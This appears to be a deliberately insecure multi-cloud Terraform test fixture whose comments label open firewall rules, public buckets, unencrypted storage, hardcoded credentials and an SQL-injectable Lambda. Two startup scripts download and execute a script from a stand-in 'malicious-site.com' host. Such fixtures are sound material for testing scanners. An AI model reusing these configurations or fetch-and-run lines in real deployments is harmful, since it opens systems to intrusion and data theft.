# Complex Multi-Cloud Terraform Configuration with Security Vulnerabilities
# This file contains intentional security issues and expensive resources for testing

terraform {
  required_version = ">= 1.0"
  required_providers {
    aws = {
      source  = "hashicorp/aws"
      version = "~> 5.0"
    }
    azurerm = {
      source  = "hashicorp/azurerm"
      version = "~> 3.0"
    }
    google = {
      source  = "hashicorp/google"
      version = "~> 4.0"
    }
  }
}

# Variables with insecure defaults
variable "environment" {
  description = "Environment name"
  type        = string
  default     = "production"
}

variable "db_password" {
  description = "Database password"
  type        = string
  default     = "admin123"  # VULNERABILITY: Weak default password
  sensitive   = false       # VULNERABILITY: Not marked as sensitive
}

variable "api_key" {
  description = "API key for external service"
  type        = string
  default     = "sk-1234567890abcdef"  # VULNERABILITY: Hardcoded API key
}

# Provider configurations
provider "aws" {
  region = "us-west-2"
  # VULNERABILITY: No assume role or MFA
}

provider "azurerm" {
  features {}
  # VULNERABILITY: Using default authentication
}

provider "google" {
  project = "my-gcp-project-123"
  region  = "us-central1"
  # VULNERABILITY: Hardcoded project ID
}

# Data sources
data "aws_availability_zones" "available" {
  state = "available"
}

data "aws_ami" "amazon_linux" {
  most_recent = true
  owners      = ["amazon"]
  filter {
    name   = "name"
    values = ["amzn2-ami-hvm-*-x86_64-gp2"]
  }
}

# AWS Resources with vulnerabilities and high costs

# VPC and Networking
resource "aws_vpc" "main" {
  cidr_block           = "10.0.0.0/16"
  enable_dns_hostnames = true
  enable_dns_support   = true

  tags = {
    Name        = "${var.environment}-vpc"
    Environment = var.environment
  }
}

resource "aws_subnet" "public" {
  count                   = 3
  vpc_id                  = aws_vpc.main.id
  cidr_block              = "10.0.${count.index + 1}.0/24"
  availability_zone       = data.aws_availability_zones.available.names[count.index]
  map_public_ip_on_launch = true  # VULNERABILITY: Auto-assign public IPs

  tags = {
    Name = "${var.environment}-public-subnet-${count.index + 1}"
    Type = "public"
  }
}

resource "aws_subnet" "private" {
  count             = 3
  vpc_id            = aws_vpc.main.id
  cidr_block        = "10.0.${count.index + 10}.0/24"
  availability_zone = data.aws_availability_zones.available.names[count.index]

  tags = {
    Name = "${var.environment}-private-subnet-${count.index + 1}"
    Type = "private"
  }
}

resource "aws_internet_gateway" "main" {
  vpc_id = aws_vpc.main.id

  tags = {
    Name = "${var.environment}-igw"
  }
}

# Security Groups with vulnerabilities
resource "aws_security_group" "web" {
  name_prefix = "${var.environment}-web-"
  vpc_id      = aws_vpc.main.id

  # VULNERABILITY: SSH open to the world
  ingress {
    from_port   = 22
    to_port     = 22
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # VULNERABILITY: RDP open to the world
  ingress {
    from_port   = 3389
    to_port     = 3389
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # VULNERABILITY: All traffic allowed
  ingress {
    from_port   = 0
    to_port     = 65535
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # VULNERABILITY: All outbound traffic allowed
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    Name = "${var.environment}-web-sg"
  }
}

resource "aws_security_group" "database" {
  name_prefix = "${var.environment}-db-"
  vpc_id      = aws_vpc.main.id

  # VULNERABILITY: Database port open to the world
  ingress {
    from_port   = 3306
    to_port     = 3306
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  # VULNERABILITY: PostgreSQL open to the world
  ingress {
    from_port   = 5432
    to_port     = 5432
    protocol    = "tcp"
    cidr_blocks = ["0.0.0.0/0"]
  }

  tags = {
    Name = "${var.environment}-db-sg"
  }
}

# S3 Buckets with security issues and expensive storage classes
resource "aws_s3_bucket" "public_data" {
  bucket        = "${var.environment}-public-data-${random_string.bucket_suffix.result}"
  force_destroy = true

  tags = {
    Name        = "${var.environment}-public-data"
    Environment = var.environment
  }
}

resource "aws_s3_bucket" "private_data" {
  bucket        = "${var.environment}-private-data-${random_string.bucket_suffix.result}"
  force_destroy = true

  tags = {
    Name        = "${var.environment}-private-data"
    Environment = var.environment
  }
}

resource "aws_s3_bucket" "glacier_archive" {
  bucket        = "${var.environment}-glacier-archive-${random_string.bucket_suffix.result}"
  force_destroy = true

  tags = {
    Name        = "${var.environment}-glacier-archive"
    Environment = var.environment
  }
}

resource "random_string" "bucket_suffix" {
  length  = 8
  upper   = false
  special = false
}

# VULNERABILITY: Public access block disabled
resource "aws_s3_bucket_public_access_block" "public_data" {
  bucket = aws_s3_bucket.public_data.id

  block_public_acls       = false
  block_public_policy     = false
  ignore_public_acls      = false
  restrict_public_buckets = false
}

# VULNERABILITY: No public access block for private bucket
# resource "aws_s3_bucket_public_access_block" "private_data" {
#   bucket = aws_s3_bucket.private_data.id
# }

# VULNERABILITY: Bucket policy allowing public access
resource "aws_s3_bucket_policy" "public_data" {
  bucket = aws_s3_bucket.public_data.id

  policy = jsonencode({
    Statement = [
      {
        Sid       = "PublicReadGetObject"
        Effect    = "Allow"
        Principal = "*"  # VULNERABILITY: Wildcard principal
        Action = [
          "s3:GetObject",
          "s3:ListBucket",
          "s3:DeleteObject"  # VULNERABILITY: Public delete access
        ]
        Resource = [
          aws_s3_bucket.public_data.arn,
          "${aws_s3_bucket.public_data.arn}/*"
        ]
      }
    ]
  })
}

# VULNERABILITY: No encryption for private bucket
# resource "aws_s3_bucket_server_side_encryption_configuration" "private_data" {
#   bucket = aws_s3_bucket.private_data.id
# }

# VULNERABILITY: Versioning disabled
resource "aws_s3_bucket_versioning" "public_data" {
  bucket = aws_s3_bucket.public_data.id
  versioning_configuration {
    status = "Suspended"
  }
}

# Expensive storage classes
resource "aws_s3_object" "large_files" {
  count                  = 100
  bucket                 = aws_s3_bucket.glacier_archive.id
  key                    = "large-file-${count.index}.dat"
  content                = "This is a large file content repeated many times..."
  storage_class          = "GLACIER"  # Expensive for frequent access
  server_side_encryption = "AES256"
}

# EC2 Instances - Expensive types
resource "aws_instance" "web_servers" {
  count                       = 5
  ami                         = data.aws_ami.amazon_linux.id
  instance_type               = "m5.8xlarge"  # EXPENSIVE: Large instance type
  subnet_id                   = aws_subnet.public[count.index % 3].id
  vpc_security_group_ids      = [aws_security_group.web.id]
  associate_public_ip_address = true
  monitoring                  = false  # VULNERABILITY: Detailed monitoring disabled

  user_data = base64encode(<<-EOF
    #!/bin/bash
    yum update -y
    # VULNERABILITY: Installing from untrusted source
    wget http://malicious-site.com/install.sh
    chmod +x install.sh
    ./install.sh
    # VULNERABILITY: Hardcoded credentials
    echo "DB_PASSWORD=${var.db_password}" >> /etc/environment
    echo "API_KEY=${var.api_key}" >> /etc/environment
  EOF
  )

  # VULNERABILITY: No IAM instance profile
  # iam_instance_profile = aws_iam_instance_profile.web.name

  root_block_device {
    volume_type = "gp3"
    volume_size = 500  # EXPENSIVE: Large root volume
    encrypted   = false  # VULNERABILITY: Root volume not encrypted
  }

  tags = {
    Name        = "${var.environment}-web-server-${count.index + 1}"
    Environment = var.environment
  }
}

# GPU instances for machine learning (very expensive)
resource "aws_instance" "gpu_workers" {
  count                  = 3
  ami                    = data.aws_ami.amazon_linux.id
  instance_type          = "p4d.24xlarge"  # VERY EXPENSIVE: GPU instance
  subnet_id              = aws_subnet.private[0].id
  vpc_security_group_ids = [aws_security_group.web.id]

  tags = {
    Name        = "${var.environment}-gpu-worker-${count.index + 1}"
    Environment = var.environment
  }
}

# RDS Database with vulnerabilities and expensive configuration
resource "aws_db_subnet_group" "main" {
  name       = "${var.environment}-db-subnet-group"
  subnet_ids = [aws_subnet.private[0].id, aws_subnet.private[1].id]

  tags = {
    Name = "${var.environment}-db-subnet-group"
  }
}

resource "aws_db_instance" "mysql" {
  identifier             = "${var.environment}-mysql-db"
  engine                 = "mysql"
  engine_version         = "5.7.44"  # VULNERABILITY: Older version
  instance_class         = "db.r5.8xlarge"  # EXPENSIVE: Large instance
  allocated_storage      = 1000  # EXPENSIVE: Large storage
  storage_type           = "io1"  # EXPENSIVE: Provisioned IOPS
  iops                   = 3000   # EXPENSIVE: High IOPS
  storage_encrypted      = false  # VULNERABILITY: Not encrypted
  
  db_name  = "myapp"
  username = "admin"
  password = var.db_password  # VULNERABILITY: Weak password
  
  vpc_security_group_ids = [aws_security_group.database.id]
  db_subnet_group_name   = aws_db_subnet_group.main.name
  
  backup_retention_period = 0      # VULNERABILITY: No backups
  multi_az               = false    # VULNERABILITY: No high availability
  publicly_accessible   = true     # VULNERABILITY: Publicly accessible
  deletion_protection    = false    # VULNERABILITY: No deletion protection
  
  skip_final_snapshot = true
  
  # VULNERABILITY: No enhanced monitoring
  monitoring_interval = 0

  tags = {
    Name        = "${var.environment}-mysql-db"
    Environment = var.environment
  }
}

# ElastiCache cluster without encryption
resource "aws_elasticache_subnet_group" "main" {
  name       = "${var.environment}-cache-subnet"
  subnet_ids = aws_subnet.private[*].id
}

resource "aws_elasticache_replication_group" "redis" {
  replication_group_id       = "${var.environment}-redis"
  description                = "Redis cluster for caching"
  
  node_type                  = "cache.r6g.2xlarge"  # EXPENSIVE: Large cache nodes
  port                       = 6379
  parameter_group_name       = "default.redis7"
  
  num_cache_clusters         = 6  # EXPENSIVE: Many nodes
  
  subnet_group_name          = aws_elasticache_subnet_group.main.name
  security_group_ids         = [aws_security_group.database.id]
  
  # VULNERABILITY: No encryption at rest
  at_rest_encryption_enabled = false
  # VULNERABILITY: No encryption in transit
  transit_encryption_enabled = false
  
  automatic_failover_enabled = true

  tags = {
    Name        = "${var.environment}-redis"
    Environment = var.environment
  }
}

# Lambda functions with security issues
resource "aws_iam_role" "lambda" {
  name = "${var.environment}-lambda-role"

  assume_role_policy = jsonencode({
    Statement = [
      {
        Action = "sts:AssumeRole"
        Effect = "Allow"
        Principal = {
          Service = "lambda.amazonaws.com"
        }
      }
    ]
  })

  # VULNERABILITY: Overly permissive managed policy
  managed_policy_arns = [
    "arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole",
    "arn:aws:iam::aws:policy/AmazonS3FullAccess"
  ]
}

resource "aws_lambda_function" "data_processor" {
  filename         = "lambda_function.zip"
  function_name    = "${var.environment}-data-processor"
  role            = aws_iam_role.lambda.arn
  handler         = "index.handler"
  runtime         = "python3.8"  # VULNERABILITY: Older runtime version
  timeout         = 900  # EXPENSIVE: Long timeout
  memory_size     = 3008  # EXPENSIVE: Maximum memory

  environment {
    variables = {
      DB_PASSWORD = var.db_password  # VULNERABILITY: Sensitive data in env vars
      API_KEY     = var.api_key      # VULNERABILITY: API key in env vars
    }
  }

  # VULNERABILITY: No VPC configuration
  # vpc_config {
  #   subnet_ids         = aws_subnet.private[*].id
  #   security_group_ids = [aws_security_group.lambda.id]
  # }

  tags = {
    Name        = "${var.environment}-data-processor"
    Environment = var.environment
  }
}

# Create a dummy zip file for Lambda
data "archive_file" "lambda_zip" {
  type        = "zip"
  output_path = "lambda_function.zip"
  source {
    content = <<-EOT
import json
import os

# VULNERABILITY: Hardcoded credentials
aws_access_key = 'AKIAIOSFODNN7EXAMPLE'
aws_secret_key = 'wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY'

def handler(event, context):
    # VULNERABILITY: No input validation
    user_input = event.get('user_data', '')
    
    # VULNERABILITY: SQL injection potential
    query = f"SELECT * FROM users WHERE name = '{user_input}'"
    
    return {
        'statusCode': 200,
        'body': json.dumps('Hello from Lambda!')
    }
EOT
    filename = "index.py"
  }
}

# Application Load Balancer
resource "aws_lb" "main" {
  name               = "${var.environment}-alb"
  internal           = false
  load_balancer_type = "application"
  security_groups    = [aws_security_group.web.id]
  subnets            = aws_subnet.public[*].id

  # VULNERABILITY: Access logs disabled
  # access_logs {
  #   bucket  = aws_s3_bucket.logs.bucket
  #   prefix  = "alb-logs"
  #   enabled = true
  # }

  tags = {
    Name        = "${var.environment}-alb"
    Environment = var.environment
  }
}

# EBS Volumes without encryption
resource "aws_ebs_volume" "unencrypted" {
  count             = 10
  availability_zone = data.aws_availability_zones.available.names[0]
  size              = 100  # EXPENSIVE: Large volumes
  type              = "gp3"
  encrypted         = false  # VULNERABILITY: Not encrypted

  tags = {
    Name        = "${var.environment}-unencrypted-volume-${count.index + 1}"
    Environment = var.environment
  }
}

# Azure Resources (expensive VM types)
resource "azurerm_resource_group" "main" {
  name     = "${var.environment}-rg"
  location = "East US"
}

resource "azurerm_virtual_network" "main" {
  name                = "${var.environment}-vnet"
  address_space       = ["10.1.0.0/16"]
  location            = azurerm_resource_group.main.location
  resource_group_name = azurerm_resource_group.main.name
}

resource "azurerm_subnet" "internal" {
  name                 = "internal"
  resource_group_name  = azurerm_resource_group.main.name
  virtual_network_name = azurerm_virtual_network.main.name
  address_prefixes     = ["10.1.2.0/24"]
}

# Expensive Azure VM
resource "azurerm_network_interface" "main" {
  count               = 3
  name                = "${var.environment}-nic-${count.index + 1}"
  location            = azurerm_resource_group.main.location
  resource_group_name = azurerm_resource_group.main.name

  ip_configuration {
    name                          = "internal"
    subnet_id                     = azurerm_subnet.internal.id
    private_ip_address_allocation = "Dynamic"
    public_ip_address_id          = azurerm_public_ip.main[count.index].id
  }
}

resource "azurerm_public_ip" "main" {
  count               = 3
  name                = "${var.environment}-pip-${count.index + 1}"
  location            = azurerm_resource_group.main.location
  resource_group_name = azurerm_resource_group.main.name
  allocation_method   = "Dynamic"
}

# VULNERABILITY: Network security group allowing all traffic
resource "azurerm_network_security_group" "main" {
  name                = "${var.environment}-nsg"
  location            = azurerm_resource_group.main.location
  resource_group_name = azurerm_resource_group.main.name

  security_rule {
    name                       = "allow_all_inbound"
    priority                   = 100
    direction                  = "Inbound"
    access                     = "Allow"
    protocol                   = "*"
    source_port_range          = "*"
    destination_port_range     = "*"
    source_address_prefix      = "*"
    destination_address_prefix = "*"
  }
}

resource "azurerm_virtual_machine" "main" {
  count                 = 3
  name                  = "${var.environment}-vm-${count.index + 1}"
  location              = azurerm_resource_group.main.location
  resource_group_name   = azurerm_resource_group.main.name
  network_interface_ids = [azurerm_network_interface.main[count.index].id]
  vm_size               = "Standard_D64s_v3"  # EXPENSIVE: Large VM size

  delete_os_disk_on_termination = true

  storage_image_reference {
    publisher = "Canonical"
    offer     = "UbuntuServer"
    sku       = "18.04-LTS"  # VULNERABILITY: Older Ubuntu version
    version   = "latest"
  }

  storage_os_disk {
    name              = "${var.environment}-osdisk-${count.index + 1}"
    caching           = "ReadWrite"
    create_option     = "FromImage"
    managed_disk_type = "Premium_LRS"  # EXPENSIVE: Premium SSD
  }

  os_profile {
    computer_name  = "hostname"
    admin_username = "testadmin"
    admin_password = "Password1234!"  # VULNERABILITY: Weak password
  }

  os_profile_linux_config {
    disable_password_authentication = false  # VULNERABILITY: Password auth enabled
  }

  tags = {
    environment = var.environment
  }
}

# Google Cloud Resources
resource "google_compute_network" "vpc_network" {
  name                    = "${var.environment}-vpc"
  auto_create_subnetworks = false
}

resource "google_compute_subnetwork" "subnet" {
  name          = "${var.environment}-subnet"
  ip_cidr_range = "10.2.0.0/16"
  region        = "us-central1"
  network       = google_compute_network.vpc_network.id
}

# VULNERABILITY: Firewall rule allowing all traffic
resource "google_compute_firewall" "allow_all" {
  name    = "${var.environment}-allow-all"
  network = google_compute_network.vpc_network.name

  allow {
    protocol = "icmp"
  }

  allow {
    protocol = "tcp"
    ports    = ["0-65535"]  # VULNERABILITY: All ports open
  }

  source_ranges = ["0.0.0.0/0"]  # VULNERABILITY: All IPs allowed
}

# Expensive GCP instances
resource "google_compute_instance" "vm_instance" {
  count        = 4
  name         = "${var.environment}-instance-${count.index + 1}"
  machine_type = "n1-highmem-96"  # EXPENSIVE: Large instance type
  zone         = "us-central1-a"

  boot_disk {
    initialize_params {
      image = "debian-cloud/debian-11"
      size  = 500  # EXPENSIVE: Large disk
      type  = "pd-ssd"  # EXPENSIVE: SSD storage
    }
  }

  network_interface {
    network    = google_compute_network.vpc_network.name
    subnetwork = google_compute_subnetwork.subnet.name

    access_config {
      # VULNERABILITY: External IP assigned
    }
  }

  metadata = {
    # VULNERABILITY: Sensitive data in metadata
    database_password = var.db_password
    api_key          = var.api_key
  }

  metadata_startup_script = <<-EOF
    #!/bin/bash
    apt update
    # VULNERABILITY: Installing from untrusted source
    wget http://malicious-site.com/install.sh
    chmod +x install.sh
    ./install.sh
  EOF

  tags = ["${var.environment}", "web", "vulnerable"]
}

# Cloud SQL with vulnerabilities
resource "google_sql_database_instance" "postgres" {
  name             = "${var.environment}-postgres-${random_string.bucket_suffix.result}"
  database_version = "POSTGRES_13"  # VULNERABILITY: Older version
  region           = "us-central1"

  settings {
    tier = "db-custom-8-32768"  # EXPENSIVE: Large instance

    database_flags {
      name  = "log_statement"
      value = "none"  # VULNERABILITY: No statement logging
    }

    backup_configuration {
      enabled = false  # VULNERABILITY: Backups disabled
    }

    ip_configuration {
      ipv4_enabled    = true
      authorized_networks {
        value = "0.0.0.0/0"  # VULNERABILITY: Open to all IPs
      }
    }
  }

  deletion_protection = false  # VULNERABILITY: No deletion protection
}

# Outputs
output "aws_instance_public_ips" {
  description = "Public IP addresses of AWS EC2 instances"
  value       = aws_instance.web_servers[*].public_ip
}

output "azure_vm_public_ips" {
  description = "Public IP addresses of Azure VMs"
  value       = azurerm_public_ip.main[*].ip_address
}

output "gcp_instance_external_ips" {
  description = "External IP addresses of GCP instances"
  value       = google_compute_instance.vm_instance[*].network_interface.0.access_config.0.nat_ip
}

output "database_endpoints" {
  description = "Database connection endpoints"
  value = {
    aws_mysql = aws_db_instance.mysql.endpoint
    gcp_postgres = google_sql_database_instance.postgres.connection_name
  }
  sensitive = true
}

output "estimated_monthly_cost" {
  description = "Estimated monthly cost (very rough calculation)"
  value = "This infrastructure will cost approximately $15,000-25,000 per month"
}